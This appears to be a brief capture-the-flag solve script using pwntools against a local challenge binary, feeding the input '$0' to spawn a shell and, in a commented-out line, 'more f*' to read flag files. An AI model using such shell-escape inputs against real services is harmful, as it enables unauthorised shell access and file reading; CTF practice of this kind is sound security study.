from pwn import *

io = process("./pwn")

io.sendlineafter(b"what do you want: ", b"$0")
# io.sendlineafter(b"what do you want: ", b"more f*")
io.interactive()
